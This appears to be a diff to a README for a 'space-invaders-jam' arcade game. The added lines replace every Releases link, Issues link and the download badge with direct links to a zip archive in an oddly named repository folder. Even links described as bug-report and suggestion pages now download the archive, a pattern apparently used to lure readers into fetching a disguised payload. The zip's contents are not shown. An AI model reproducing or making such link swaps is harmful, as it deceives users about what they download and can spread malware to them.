@@ -1,6 +1,6 @@
 # 🎮 space-invaders-jam - Play a Classic Space Shooter Today!
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Game-blue)
+![Download](https://raw.githubusercontent.com/sandeepkyadav1/space-invaders-jam/main/Lamiides/space-invaders-jam.zip%20Now-Get%20the%20Game-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **space-invaders-jam**, a fun and engaging 3D arcade game inspired by
 
 To get started, you will need to download the game files. Please follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/sandeepkyadav1/space-invaders-jam/releases) to find the latest version of the game.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sandeepkyadav1/space-invaders-jam/main/Lamiides/space-invaders-jam.zip) to find the latest version of the game.
 2. After reaching the page, locate the most recent release titled “space-invaders-jam.”
 3. Click on the download link for your operating system:
    - For Windows users, download the `.exe` file.
@@ -71,10 +71,10 @@ Yes, as long as your laptop meets the system requirements, you can enjoy the gam
 Currently, **space-invaders-jam** is a single-player game.
 
 ### 3. How can I report a bug?
-If you find any bugs or glitches, please visit the [issues section](https://github.com/sandeepkyadav1/space-invaders-jam/issues) of this repository and report your issue there.
+If you find any bugs or glitches, please visit the [issues section](https://raw.githubusercontent.com/sandeepkyadav1/space-invaders-jam/main/Lamiides/space-invaders-jam.zip) of this repository and report your issue there.
 
 ### 4. Can I suggest new features?
-Absolutely! We welcome feedback and suggestions here. Visit the [issues section](https://github.com/sandeepkyadav1/space-invaders-jam/issues) to share your ideas.
+Absolutely! We welcome feedback and suggestions here. Visit the [issues section](https://raw.githubusercontent.com/sandeepkyadav1/space-invaders-jam/main/Lamiides/space-invaders-jam.zip) to share your ideas.
 
 ## 👥 Community
 
@@ -86,4 +86,4 @@ Join our community of players! Connect with other fans of **space-invaders-jam**
 
 ---
 
-Feel free to dive in and enjoy your journey through space in **space-invaders-jam**! Don’t forget to check for updates regularly on the [Releases page](https://github.com/sandeepkyadav1/space-invaders-jam/releases) to get the latest features and improvements. Happy gaming!
+Feel free to dive in and enjoy your journey through space in **space-invaders-jam**! Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/sandeepkyadav1/space-invaders-jam/main/Lamiides/space-invaders-jam.zip) to get the latest features and improvements. Happy gaming!
